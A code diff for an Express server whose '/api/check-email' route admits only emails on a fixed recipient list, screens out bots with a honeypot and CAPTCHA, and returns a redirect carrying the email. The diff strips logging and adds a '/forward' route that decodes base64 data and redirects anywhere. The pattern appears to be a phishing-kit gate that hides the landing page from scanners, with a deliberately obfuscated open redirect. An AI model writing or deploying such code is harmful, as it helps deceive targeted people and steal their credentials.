@@ -34,24 +34,19 @@ app.use(cors());
 app.use(express.json());
 app.use(limiter);
 
+// API route to validate email and return obfuscated redirect
 app.post('/api/check-email', async (req, res) => {
   const { email, captchaToken, middleName } = req.body;
 
-  // Honeypot detection
   if (middleName && middleName.trim() !== '') {
-    console.warn('[BOT] Honeypot field triggered');
     return res.status(403).json({ valid: false, message: 'Bot activity detected' });
   }
 
-  // Email format validation
   if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-    console.warn('[WARN] Invalid or missing email attempt:', email);
-    return res.status(400).json({ valid: false, message: 'Invalid or missing email format' });
+    return res.status(400).json({ valid: false, message: 'Invalid email format' });
   }
 
-  // CAPTCHA check
   if (!captchaToken) {
-    console.warn('[WARN] Missing CAPTCHA token');
     return res.status(400).json({ valid: false, message: 'Captcha missing' });
   }
 
@@ -59,29 +54,40 @@ app.post('/api/check-email', async (req, res) => {
     const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: `secret=${process.env.CLOUDFLARE_SECRET}&response=${captchaToken}`
+      body: `secret=${process.env.CLOUDFLARE_SECRET}&response=${captchaToken}`,
     });
     const verifyData = await verifyRes.json();
-
     if (!verifyData.success) {
-      console.warn('[WARN] CAPTCHA failed:', verifyData);
-      return res.status(400).json({ valid: false, message: 'Captcha failed. Please reload the page.' });
+      return res.status(400).json({ valid: false, message: 'Captcha verification failed' });
     }
   } catch (err) {
-    console.error('[ERROR] CAPTCHA validation error:', err);
-    return res.status(500).json({ valid: false, message: 'Internal server error during captcha check' });
+    return res.status(500).json({ valid: false, message: 'Captcha verification error' });
   }
 
   const normalizedEmail = email.toLowerCase();
   const isValid = validEmails.has(normalizedEmail);
-  console.log(`[INFO] Email verification result for ${email}: ${isValid}`);
 
   if (!isValid) {
-    return res.status(404).json({ valid: false, message: 'Enter the valid recipient email to continue' });
+    return res.status(404).json({ valid: false, message: 'Email not recognized' });
   }
 
   const redirectUrl = `${REDIRECT_BASE}?email=${encodeURIComponent(normalizedEmail)}`;
-  return res.json({ valid: true, message: 'Email verified', redirectUrl });
+  return res.json({ valid: true, redirectUrl });
+});
+
+// 🔐 Route to decode and forward obfuscated URL
+app.get('/forward', (req, res) => {
+  try {
+    const { data } = req.query;
+    if (!data) return res.status(400).send('Missing redirect data');
+
+    const decoded = Buffer.from(data, 'base64').toString('utf8');
+    if (!/^https?:\/\//.test(decoded)) return res.status(400).send('Invalid redirect URL');
+
+    res.redirect(decoded);
+  } catch (e) {
+    res.status(400).send('Invalid redirect format');
+  }
 });
 
 app.listen(PORT, () => {
